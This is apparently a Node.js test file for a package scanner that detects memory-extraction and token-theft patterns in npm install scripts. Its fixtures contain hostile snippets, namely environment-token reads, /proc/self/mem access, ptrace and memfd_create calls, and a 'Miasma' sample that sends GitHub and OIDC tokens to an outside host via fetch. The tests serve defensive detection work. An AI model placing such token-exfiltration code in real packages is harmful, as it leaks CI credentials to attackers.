import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/tier1-memory-extraction.js';

test('D15: OIDC token access (process.env.OIDC_TOKEN) detected as HIGH', async () => {
  const files = [{ path: 'install.js', content: 'const token = process.env.OIDC_TOKEN' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'oidc_token_access'));
});

test('D15: /proc/self/mem access detected as HIGH', async () => {
  const files = [{ path: 'install.js', content: 'fs.readFileSync("/proc/self/mem")' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'memory_introspection'));
});

test('D15: GITHUB_TOKEN via OIDC pattern detected', async () => {
  const files = [{ path: 'install.js', content: 'const token = process.env.GITHUB_TOKEN' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'oidc_token_access'));
});

test('D15: legitimate env access (process.env.NODE_ENV) produces LOW findings', async () => {
  const files = [
    { path: 'install.js', content: 'const env = process.env.NODE_ENV || "production"' },
  ];
  const findings = await scan({}, [], null, files);
  assert.equal(findings.length, 0);
});

test('D15: Real Miasma escalated sample returns BLOCK recommendation', async () => {
  const files = [
    {
      path: 'install.js',
      content: `
      const tokens = {};
      tokens.gh = process.env.GITHUB_TOKEN;
      tokens.oidc = process.env.OIDC_TOKEN;
      // OIDC tokens directly accessed for exfiltration
      fetch("https://filev2.getsession.org/exfil", { body: JSON.stringify(tokens) });
    `,
    },
  ];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].recommendation?.startsWith('BLOCK'));
});

test('D15: empty package returns no findings', async () => {
  const findings = await scan({}, [], null, []);
  assert.equal(findings.length, 0);
});

test('D15: no files returns no findings', async () => {
  const findings = await scan({}, [], null, null);
  assert.equal(findings.length, 0);
});

test('D15: ptrace syscall detected', async () => {
  const files = [{ path: 'install.js', content: 'ptrace(PTRACE_ATTACH, pid);' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'memory_introspection'));
});

test('D15: memfd_create pattern detected', async () => {
  const files = [{ path: 'install.js', content: 'const fd = memfd_create("secret");' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'memory_introspection'));
});
